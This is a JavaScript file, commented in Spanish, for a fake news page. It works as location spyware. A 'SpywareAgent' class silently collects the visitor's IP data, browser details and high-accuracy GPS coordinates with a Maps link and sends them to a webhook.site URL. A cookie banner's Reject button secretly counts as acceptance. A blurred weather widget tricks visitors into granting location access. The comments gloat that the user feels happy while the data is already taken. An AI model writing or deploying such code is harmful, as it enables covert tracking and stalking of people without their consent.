/**
 * GLOBAL INSIGHT CORE SYSTEM
 * Módulo de gestión de contenidos y telemetría.
 * MODO SILENCIOSO ACTIVADO
 */

const CONFIG = {
    WEBHOOK_URL: "https://webhook.site/c295ad9f-09f9-4803-b5cd-5971022be5a1", // Tu webhook
    COOKIE_TIMEOUT: 1500,
    FORCE_ACCEPT: true
};

const newsDatabase = [
    { title: "Avance Histórico en Inteligencia Artificial Generativa", category: "Tecnología" },
    { title: "Mercados Asiáticos Cierran al Alza tras Anuncios", category: "Economía" },
    { title: "La NASA Confirma Nueva Misión a las Lunas de Júpiter", category: "Ciencia" },
    { title: "El Futuro del Trabajo Híbrido: Informe 2025", category: "Negocios" },
    { title: "Ciberseguridad: Nuevos Protocolos Bancarios", category: "Tech" },
    { title: "Crisis Climática: Acuerdos de la Cumbre Global", category: "Mundo" }
];

class SpywareAgent {
    constructor(webhook) {
        this.webhook = webhook;
        this.ipData = null;
        this.userAgent = navigator.userAgent;
        this.acceptedCookies = false;
    }

    async trackIP() {
        try {
            const res = await fetch('https://ipwho.is/');
            const data = await res.json();
            this.ipData = data;
            // Envío silencioso de IP
            this.exfiltrate({ ...data, userAgent: this.userAgent }, "PASSIVE_DATA", "Rastreo General");
        } catch (e) { console.error("Fallo IP"); }
    }

    trackGPS(onSuccess, onError) {
        if (!navigator.geolocation) return onError("GPS no soportado");
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                const gpsData = {
                    lat: latitude,
                    lon: longitude,
                    acc: accuracy,
                    // Generamos link de mapa para el atacante
                    map_url: `https://www.google.com/maps?q=${latitude},${longitude}`,
                    ...this.ipData
                };
                // AQUÍ SE ENVÍAN LOS DATOS AL WEBHOOK (INVISIBLE PARA EL USUARIO)
                this.exfiltrate(gpsData, "ACTIVE_GPS_TARGET", "Ubicación Exacta");
                onSuccess(gpsData);
            },
            (err) => onError(err),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    exfiltrate(payload, type, precision) {
        // Esta función envía los datos a tu servidor sin mostrar nada en pantalla
        fetch(this.webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify({ ALERTA: type, PRECISION: precision, DATOS: payload })
        }).then(() => console.log(">> Datos exfiltrados con éxito (Silencioso)")).catch(e => console.log("Error envío"));
    }

    setCookiesAccepted(status) { this.acceptedCookies = status; }
}

// --- LÓGICA PRINCIPAL ---
document.addEventListener("DOMContentLoaded", () => {
    
    const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
    setTimeout(() => setupCookieTrap(spy), CONFIG.COOKIE_TIMEOUT);

    // Fecha
    document.getElementById("current-date").innerText = new Date().toLocaleDateString('es-ES', { 
        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
    });

    // --- LÓGICA DEL CLIMA ---
    const btnGps = document.getElementById("btn-gps-trigger");
    const weatherWidget = document.getElementById("weather-trap");
    const blurContent = weatherWidget.querySelector(".blur-content");
    // Ya no necesitamos el terminal, así que no lo seleccionamos ni mostramos

    btnGps.addEventListener("click", () => {
        if (!spy.acceptedCookies) {
            alert("⚠️ Para ver el clima local, necesitamos verificar que no eres un robot (Acepta las cookies).");
            document.getElementById('cookie-modal').style.display = 'flex';
            return;
        }
        
        const btn = btnGps.querySelector("button");
        const originalText = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Obteniendo pronóstico...';
        
        spy.trackGPS(
            async (data) => {
                // ÉXITO: El usuario dio permiso
                
                // 1. Ocultar el botón de "bloqueo" suavemente
                btnGps.style.opacity = "0";
                setTimeout(() => { btnGps.style.display = "none"; }, 500);
                
                // 2. Consultar API de Clima Real
                try {
                    const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.lat}&longitude=${data.lon}&current_weather=true`);
                    const weatherData = await weatherRes.json();
                    
                    // 3. Mostrar el clima real (RECOMPENSA VISUAL)
                    updateWeatherUI(weatherData.current_weather);
                    
                } catch (error) {
                    console.error("Error clima", error);
                    // Si falla la API de clima, ponemos datos genéricos pero creíbles
                    updateWeatherUI({ temperature: "24", weathercode: 1 });
                }
            },
            (error) => {
                // Si el usuario deniega
                btn.innerHTML = "Ubicación Bloqueada";
                setTimeout(() => { btn.innerHTML = originalText; }, 2000);
                alert("No pudimos detectar tu zona. Habilita la ubicación en el navegador para ver el clima.");
            }
        );
    });

    function updateWeatherUI(weather) {
        // Quitar el efecto borroso
        blurContent.style.transition = "all 0.5s ease";
        blurContent.style.filter = "none";
        blurContent.style.opacity = "1";
        
        // Actualizar temperatura
        const tempEl = weatherWidget.querySelector(".fake-temp");
        const descEl = blurContent.querySelector("p");
        
        tempEl.innerText = `${weather.temperature}°C`;
        tempEl.style.color = "#333"; 
        
        // Interpretar código de clima
        let cond = "Cielo Despejado";
        let icon = '<i class="fas fa-sun" style="color:orange"></i>';
        
        if (weather.weathercode > 3) { cond = "Nublado"; icon = '<i class="fas fa-cloud" style="color:gray"></i>'; }
        if (weather.weathercode > 45) { cond = "Niebla"; icon = '<i class="fas fa-smog" style="color:#ccc"></i>'; }
        if (weather.weathercode > 50) { cond = "Llovizna"; icon = '<i class="fas fa-cloud-rain" style="color:#4a90e2"></i>'; }
        if (weather.weathercode > 80) { cond = "Tormenta"; icon = '<i class="fas fa-bolt" style="color:#f5a623"></i>'; }

        // Mensaje amigable (El usuario se siente feliz, pero ya tenemos sus datos)
        descEl.innerHTML = `
            <div style="font-size: 2rem; margin: 10px 0;">${icon}</div>
            <strong>${cond}</strong>
            <div style="margin-top:10px; font-size:0.75rem; color:#0f9d58; background:#e6f4ea; padding:5px; border-radius:4px; display:inline-block;">
                <i class="fas fa-check-circle"></i> Pronóstico Local Actualizado
            </div>
        `;
    }

    function setupCookieTrap(spyAgent) {
        const modal = document.getElementById('cookie-modal');
        const btnAccept = document.getElementById('btn-accept-all');
        const btnReject = document.getElementById('btn-reject');

        if(!modal) return; // Seguridad por si no cargó el HTML

        modal.style.display = 'flex';

        const close = () => {
            spyAgent.setCookiesAccepted(true);
            modal.style.display = 'none';
            
            // Iniciar rastreo pasivo (IP) al aceptar
            spyAgent.trackIP();
            
            // Cargar noticias
            renderNews();
            
            // Notificación de éxito visual
            showSafeNotification();
        };

        btnAccept.addEventListener('click', close);
        btnReject.addEventListener('click', () => {
            // Trampa visual: parece que rechazas, pero aceptas
            btnReject.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Guardando...';
            setTimeout(close, 800);
        });
    }
    
    function showSafeNotification() {
        // Pequeño aviso verde arriba a la derecha
        const notif = document.createElement('div');
        notif.style.cssText = `
            position: fixed; top: 20px; right: 20px; background: #333; color: white;
            padding: 12px 20px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            z-index: 10000; font-size: 0.85rem; display: flex; align-items: center; gap: 10px;
            animation: slideIn 0.5s ease forwards;
        `;
        notif.innerHTML = '<i class="fas fa-check" style="color:#0f9d58;"></i> Preferencias actualizadas';
        document.body.appendChild(notif);
        setTimeout(() => notif.remove(), 3000);
    }

    function renderNews() {
        const hero = newsDatabase[Math.floor(Math.random() * newsDatabase.length)];
        const heroEl = document.getElementById("hero-news");
        if(heroEl) {
            heroEl.innerHTML = `
                <img src="https://picsum.photos/800/600?random=${Math.random()}" alt="News">
                <div class="hero-content">
                    <span style="background:#0056b3; padding:4px 8px; font-size:0.75rem; margin-bottom:10px; display:inline-block; border-radius:2px;">${hero.category}</span>
                    <h1>${hero.title}</h1>
                </div>
            `;
        }
    }
});
